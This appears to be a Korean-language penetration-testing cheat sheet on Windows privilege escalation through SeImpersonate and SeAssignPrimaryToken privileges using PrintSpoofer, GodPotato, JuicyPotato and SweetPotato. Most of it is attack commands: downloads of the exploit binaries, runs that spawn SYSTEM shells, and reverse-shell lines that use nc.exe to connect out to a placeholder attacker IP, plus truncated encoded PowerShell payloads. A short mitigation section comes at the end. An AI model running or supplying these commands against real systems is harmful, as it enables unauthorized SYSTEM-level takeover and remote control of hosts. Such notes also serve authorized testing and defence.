cu

# SeImpersonate / SeAssignPrimaryToken 권한 상승 가이드

`SeImpersonatePrivilege`와 `SeAssignPrimaryTokenPrivilege`는 Windows에서 가장 흔하게 발견되고 성공적으로 악용되는 권한 상승 벡터 중 하나입니다. 웹 서버(IIS)나 데이터베이스(MSSQL) 같은 서비스 계정이 이 권한을 보유한 경우가 많으며, 이를 통해 `NT AUTHORITY\SYSTEM`의 권한을 탈취할 수 있습니다.

### **취약점 원리**

이 권한들은 특정 프로세스가 다른 사용자(보안 주체)의 보안 토큰을 훔치거나 생성하여 스레드에 적용할 수 있게 해줍니다. 공격자는 이 권한을 가진 현재 세션에서, 로컬 시스템의 `SYSTEM` 계정이 인증을 시도하도록 유도하는 특정 RPC/DCOM 통신을 트리거합니다. 그 후, `SYSTEM`이 콜백 연결을 시도할 때 그 연결로부터 보안 토큰을 가로채, 해당 토큰으로 새로운 프로세스(예: `cmd.exe`)를 생성하여 `SYSTEM` 권한을 획득합니다. 이 일련의 과정을 자동화한 것이 바로 "Potato" 시리즈 공격입니다.

---

### **1. 취약점 식별**

- **목표:** 현재 사용자가 해당 권한을 보유하고 있는지 확인합니다.

```powershell title="현재 세션의 권한 확인"
whoami /priv
```

- **확인 사항:** 출력된 목록에 `SeImpersonatePrivilege` 또는 `SeAssignPrimaryTokenPrivilege`가 `Enabled` 상태로 있는지 확인합니다.

---

### **2. 주요 공격 도구**

다양한 "Potato" 도구들이 있지만, 대상 Windows 버전에 따라 성공률이 다릅니다. 최신 도구를 먼저 시도하는 것이 좋습니다.

#### **PrintSpoofer (가장 추천)**
- **특징:** 최신 Windows 버전(Windows 10, Server 2019/2022)에서도 안정적으로 작동하는 가장 현대적이고 효과적인 도구입니다.
- **[GitHub 링크](https://github.com/itm4n/PrintSpoofer)**

```powershell title="PrintSpoofer - 대화형 SYSTEM 셸 획득"
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
# -i: 대화형 모드로 실행
# -c: 실행할 명령어
./PrintSpoofer64.exe -i -c cmd.exe

# If you don't, then try (32, 64 둘다 시도해보기)
./PrintSpoofer64.exe -c "c:\windows\tasks\nc.exe [kali_ip] 443 -e cmd"
```

#### **GodPotato**
- **특징:** PrintSpoofer와 마찬가지로 최신 Windows 환경을 지원하는 또 다른 강력한 도구입니다.
- **[GitHub 링크](https://github.com/BeichenDream/GodPotato)**

```powershell title="GodPotato - 리버스 셸 실행"
# -cmd: 실행할 명령어 (예: nc.exe를 이용한 리버스 셸 연결)
./GodPotato-NET4.exe -cmd "C:\Windows\tasks\nc.exe <attacker_ip> 4444 -e cmd.exe"

./Godpotato.exe -cmd cmd.exe

./GodPotato-NET4.exe -cmd "powershell.exe -C JABjAGwAaQBletc"
```

#### **JuicyPotato / RottenPotato**
- **특징:** 구형 Windows 버전(Windows 7/8/10, Server 2008/2012/2016)에서 주로 사용되던 고전적인 방식입니다. 특정 DCOM 객체의 CLSID를 필요로 하며, 최신 OS에서는 작동하지 않을 가능성이 높습니다.
- **[JuicyPotato GitHub 링크](https://github.com/ohpe/juicy-potato)**
- https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505
- Useful reference video of attack : https://youtu.be/dXotJLV6jj4?t=1848
- Run systeminfo on box and then find the proper CLSID from here : https://github.com/ohpe/juicy-potato/tree/master/CLSID/

```powershell title="JuicyPotato - 특정 CLSID로 공격"
# -t *: 프로세스 생성 방식 (t: create process, u: with token, p: with program)
# -l: 리스닝 포트
# -p: 실행할 프로그램
# -c: 사용할 DCOM CLSID
JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -l 1337 -c "{...특정_CLSID...}"

./JuicyPotatao.exe -t * -l 1337 -p "powershell.exe -e JABjetc"
```

#### **SweetPotato**
- https://github.com/CCob/SweetPotato
- https://github.com/uknowsec/SweetPotato/blob/master/README.md

```powershell
wget https://github.com/uknowsec/SweetPotato/raw/refs/heads/master/SweetPotato-Webshell-new/bin/Release/SweetPotato.exe

./SweetPotato.exe -p test.bat
```

---

### **3. 방어 (Mitigation)**

- **최소 권한의 원칙:** IIS 애플리케이션 풀 계정, MSSQL 서비스 계정 등 일반적인 서비스 계정에서 `SeImpersonatePrivilege`와 `SeAssignPrimaryTokenPrivilege`를 제거합니다. 이 권한들은 대부분의 서비스 운영에 필수적이지 않습니다.
- **가상 계정 사용:** 최신 IIS/MSSQL 버전에서 기본적으로 사용하는 가상 계정(Virtual Account)은 이러한 권한을 가지지 않으므로, 가급적 가상 계정을 사용하는 것이 안전합니다.
